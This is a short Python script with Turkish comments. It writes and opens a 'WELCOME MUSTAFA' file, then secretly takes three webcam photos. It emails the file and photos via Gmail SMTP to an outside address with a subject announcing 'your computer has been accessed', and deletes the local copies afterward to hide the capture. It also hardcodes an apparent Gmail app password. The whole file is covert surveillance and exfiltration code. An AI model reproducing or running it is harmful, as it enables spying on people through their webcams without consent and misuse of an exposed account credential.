import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import cv2
import os
import subprocess
import time

# Dosya yolu
dosya_yolu = os.path.join(os.path.expanduser('~'), 'Desktop', 'welcome_mustafa.txt')

# Desktop dizininin varlığını kontrol et ve yoksa oluştur
os.makedirs(os.path.dirname(dosya_yolu), exist_ok=True)

# Dosya oluşturma ve içine yazı ekleme
with open(dosya_yolu, 'w') as dosya:
    dosya.write('WELCOME MUSTAFA')

# Dosyayı açma (varsayılan metin düzenleyici ile)
subprocess.run(['xdg-open', dosya_yolu])

# Belirli bir kamera cihazını seçmek için cihaz numarasını değiştirin
camera_device = 0  # Örneğin, ikinci kamera

# Kamerayı açma
camera = cv2.VideoCapture(camera_device)

if not camera.isOpened():
    print(f"Kamera {camera_device} açılamadı.")
else:
    photos = []
    for i in range(3):
        return_value, image = camera.read()
        photo_path = os.path.join(os.path.expanduser('~'), f'Desktop/photo_{i+1}.png')
        cv2.imwrite(photo_path, image)
        photos.append(photo_path)
        time.sleep(1)  # Bir sonraki fotoğrafı çekmeden önce 1 saniye bekleyin

    camera.release()
    cv2.destroyAllWindows()

# Gönderen e-posta bilgileri
fromaddr = "masterfasterkiller@gmail.com"
password = "eprd afgv blwz ybfz"  # Uygulama şifresi

# Alıcı e-posta bilgileri
toaddr = "masterfasterkiller@gmail.com"

# E-posta mesajı oluşturma
msg = MIMEMultipart()
msg['From'] = fromaddr
msg['To'] = toaddr
msg['Subject'] = "BILGISAYARINIZA ERISILDI !!"

# E-posta gövdesi
body = "BILGISAYARINIZA ERISIM SAGLANDIIII."
msg.attach(MIMEText(body, 'plain'))

# Dosya ekleme fonksiyonu
def attach_file(msg, filepath):
    with open(filepath, "rb") as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(filepath)}")
        msg.attach(part)

# Metin dosyasını ekleme
attach_file(msg, dosya_yolu)

# Fotoğrafları ekleme
for photo in photos:
    attach_file(msg, photo)

# Gmail SMTP sunucusuna bağlanma ve e-posta gönderme
server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(fromaddr, password)
text = msg.as_string()
server.sendmail(fromaddr, toaddr, text)
server.quit()

print("E-posta başarıyla gönderildi.")

# Gönderilen fotoğrafları ve metin dosyasını silme
os.remove(dosya_yolu)
for photo in photos:
    os.remove(photo)
print("Fotoğraflar ve dosya başarıyla silindi.")

